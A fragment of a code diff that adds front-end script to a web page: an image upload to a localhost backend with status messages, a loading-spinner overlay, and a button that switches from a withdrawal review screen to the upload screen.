+    data.append("image", file);
+    data.append("category", category);
+
+    console.log("PARAworld: Sending image to backend...");
+    const response = await fetch("http://localhost:3001/api/support-image", {
+      method: "POST",
+      body: data
+    });
+console.log("PARAworld: Backend responded with status", response.status);
+    const result = await response.json();
+
+    if (!response.ok) {
+      throw new Error(result.error || "Image submission failed.");
+    }
+
+    message.textContent = "Your image was submitted successfully.";
+    message.className = "screen-note success";
+  } catch (error) {
+    console.error("Image submission failed:", error);
+    message.textContent =
+      "Unable to submit the image. Check that the backend is running and try again.";
+    message.className = "screen-note error";
+  } finally {
+    submitButton.disabled = false;
+  }
+});
+})();
+
+</script>
+<style>
+/* Loading overlay */
+#pageLoader {
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    background: rgba(16, 14, 10, 0.96);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 18px;
+    color: #f5c451;
+    font-family: Arial, sans-serif;
+}
+
+#pageLoader.hidden {
+    display: none;
+}
+
+.page-loader-spinner {
+    width: 58px;
+    height: 58px;
+    border: 5px solid rgba(245, 196, 81, 0.2);
+    border-top-color: #f5c451;
+    border-radius: 50%;
+    animation: pageLoaderSpin 0.8s linear infinite;
+}
+
+@keyframes pageLoaderSpin {
+    to { transform: rotate(360deg); }
+}
+
+</style>
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const uploadButton = document.getElementById("openSupportUploadFromReview");
+    const uploadScreen = document.getElementById("imageUploadScreen");
+    const reviewScreen = document.getElementById("withdrawReviewScreen");
+
+    if (!uploadButton || !uploadScreen) {
+        console.error("Image Upload button or upload screen is missing.");
+        return;
+    }
+
+    uploadButton.addEventListener("click", function () {
+        if (reviewScreen) {
+            reviewScreen.classList.add("hidden");
+            reviewScreen.classList.remove("active");
+        }
+
+        uploadScreen.classList.remove("hidden");
+        uploadScreen.classList.add("active");
+
+        window.scrollTo({ top: 0, behavior: "smooth" });
+    });
+});
 
 </script>
 </body>
 </html>
-
